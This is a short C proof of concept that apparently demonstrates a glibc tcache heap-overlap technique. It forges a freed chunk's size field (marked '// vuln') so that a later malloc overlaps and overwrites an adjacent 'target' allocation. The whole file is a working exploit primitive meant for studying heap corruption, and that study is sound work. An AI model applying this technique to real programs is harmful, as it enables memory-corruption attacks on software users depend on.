#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "malloc_struct.h"

int main(void){
	void *m;
	malloc_chunk *c;
	unsigned long *target, *victim;

	m = malloc(0x18);	// M
	c = mem2chunk(m);
	target = malloc(0x18);

	target[0] = 0xdeadbeef;
	printf("target  = %p\n*target = %#lx\n\n"
		, target, *target);

	puts("Exploit!");
	c->size = 0x41; 	// vuln
	free(m); 		// to tcache

	victim = malloc(0x38);	// overwrap target
	memset(victim, 'A', 0x38);

	printf("victim  = %p (%#zx byte)\n*target = %#lx\n"
	, victim, (mem2chunk(victim)->size)&~7, *target);
}
